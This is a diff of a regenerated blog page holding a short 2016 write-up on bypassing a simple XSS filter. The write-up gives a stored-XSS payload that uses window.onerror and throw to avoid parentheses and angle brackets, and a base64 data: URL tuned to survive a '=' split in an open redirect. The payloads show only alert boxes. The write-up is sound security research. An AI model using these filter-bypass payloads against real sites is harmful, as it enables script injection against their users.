@@ -39,17 +39,10 @@
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="A Trick to Bypass an XSS Filter and Execute JavaScript">
 <meta itemprop="description" content="I&rsquo;ve recently come across an application which had a very simple XSS filter. If the input contained the following chars, the application would throw an error:
-( ) &lt; &gt;  Simple, but annoying. I found a stored XSS vulnerability and I could not get the PoC to go off. The stored value was being returned by the server in an input but the filter was getting in the way.">
-
-
-<meta itemprop="datePublished" content="2016-02-19T15:44:39&#43;00:00" />
+( ) &lt; &gt;  Simple, but annoying. I found a stored XSS vulnerability and I could not get the PoC to go off. The stored value was being returned by the server in an input but the filter was getting in the way."><meta itemprop="datePublished" content="2016-02-19T15:44:39&#43;00:00" />
 <meta itemprop="dateModified" content="2016-02-19T15:44:39&#43;00:00" />
-<meta itemprop="wordCount" content="268">
-
-
-
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="wordCount" content="268"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/"/>
 
 <meta name="twitter:title" content="A Trick to Bypass an XSS Filter and Execute JavaScript"/>
@@ -126,64 +119,44 @@
 
             <div class="post-content">
                 <p>I&rsquo;ve recently come across an application which had a very simple XSS filter. If the input contained the following chars, the application would throw an error:</p>
-
 <pre><code>( ) &lt; &gt;
 </code></pre>
-
 <p>Simple, but annoying. I found a stored XSS vulnerability and I could not get the PoC to go off. The stored value was being returned by the server in an <code>input</code> but the filter was getting in the way.</p>
-
 <p>It would not let me submit the usual payloads:</p>
-
 <pre><code class="language-javascript">&quot; on click=alert('xss') x=&quot;
 &quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;
 </code></pre>
-
 <p>A neat trick to get alert to popup is by setting the <code>onerror</code> handler to the <code>alert</code> function and <code>throwing</code> some arbitrary error. This results in an alert box popping up with the contents of the exception.</p>
-
 <p>What worked for me was this:</p>
-
 <pre><code class="language-javascript">&quot; onclick=&quot;javascript:window.onerror=alert;throw 'XSS'&quot; x=&quot;
 </code></pre>
-
 <p>This application also had some arbitrary redirection flaw which allowed me to inject some text via the URL inside the <code>document.location.href</code> property.</p>
-
 <p>I could not escape quotations and execute, as the data was being passed by value form the URL:</p>
-
 <pre><code class="language-javascript">// http://app/?url=value
 var goto = params[&quot;url&quot;];
 document.location.href = goto;
 </code></pre>
-
 <p>So I had to get creative:</p>
-
 <pre><code class="language-javascript">// http://app/?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=
 var goto = params[&quot;url&quot;];
 document.location.href = goto;
 </code></pre>
-
 <p>Which translated to:</p>
-
 <pre><code class="language-javascript">// atob('PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=')
 // &quot;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&quot;
 
 document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='
 </code></pre>
-
 <p>This should work, but it didn&rsquo;t. Chrome was trying to navigate to:</p>
-
 <pre><code class="language-javascript">data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4
 </code></pre>
-
 <p>Notice the missing base64 padding <code>=</code>? This application populated the <code>params</code> variable using a split on <code>=</code> to get key/value pairs.</p>
-
 <p>To get around this I had to modify my code just enough to not need padding after base64 encoding:</p>
-
 <pre><code class="language-javascript">btoa('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;')
 &quot;PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;
 btoa('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;1')
 &quot;PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4x&quot;
 </code></pre>
-
 <p>and Chrome was happy to popup my alert box!</p>
 
             </div>
@@ -203,7 +176,7 @@ btoa('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;1')
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2020</span>
+            <span>&copy; 2021</span>
             
                 <span><a href="/">Bit Therapy</a></span>
             
@@ -231,7 +204,7 @@ btoa('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;1')
 
 
 
-<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
 
 
 
